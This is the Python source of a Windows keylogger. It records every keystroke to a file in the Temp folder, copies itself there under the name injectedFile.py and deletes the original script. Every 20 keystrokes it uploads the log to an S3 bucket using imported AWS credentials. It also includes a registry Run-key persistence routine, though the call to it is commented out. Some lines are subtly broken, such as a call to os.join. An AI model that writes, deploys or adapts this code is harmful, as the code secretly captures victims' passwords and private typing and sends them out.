import os
import shutil
from os.path import exists as file_exists
from botocore.exceptions import ClientError
from pynput.keyboard import Key, Listener
from secrets import access_key, secret_access_key
import boto3
import logging
import winreg as reg

temp_folder_path = "C:\\Users\\Admin\\AppData\\Local\\Temp"

original_script_path = os.getcwd() + "\\main.py"
key_count = 0
logging.basicConfig(filename=(temp_folder_path + "\\keylogs.txt"),
                    level=logging.INFO, format='%(asctime)s: %(message)s')




########################################################################################################################
# Adding a Python script to windows start-up basically means the python script will run as the windows boots up
def AddToRegistry():
    # in python __file__ is the instant of
    # file path where it was executed
    # so if it was executed from desktop,
    # then __file__ will be
    # c:\users\current_user\desktop
    pth = os.path.dirname(os.path.realpath(__file__))

    # name of the python file with extension
    s_name = "injectedFile.py"

    # joins the file name to end of path address
    address = os.join(pth, s_name)

    # key we want to change is HKEY_CURRENT_USER
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

    # open the key to make changes to
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

    # modify the opened key
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)

    # now close the opened key
    reg.CloseKey(open)
########################################################################################################################




# condition checks if we are running the script within the %TEMP% folder by checking if the injected file was created
if not file_exists(temp_folder_path + "\\injectedFile.py"):
    shutil.copy(os.getcwd() + "\\main.py", temp_folder_path)  # copy script to the temp folder
    os.rename(temp_folder_path + "\\main.py", temp_folder_path + "\\injectedFile.py")
    exec(open(temp_folder_path + "\\injectedFile.py").read())


# entering this part only if running the script from the temp folder
else:

    print("removing old script")
    os.remove(original_script_path)

    # uncomment below to add the script to windows Registry to ensure script survive restart
    # AddToRegistry()

    client = boto3.client('s3', aws_access_key_id=access_key, aws_secret_access_key=secret_access_key)


    def on_press(key):
        logging.info(str(key))

        global key_count
        key_count += 1

        # uploading to s3 every 20 keys optional to change to timer
        if key_count > 20:
            key_count = 0

            try:
                response = client.upload_file(temp_folder_path + "\\keylogs.txt", 'test1-buckest2-forme', "keylogs.txt")
            except ClientError as e:
                logging.error(e)
                return False


    with Listener(on_press=on_press) as listener:
        listener.join()
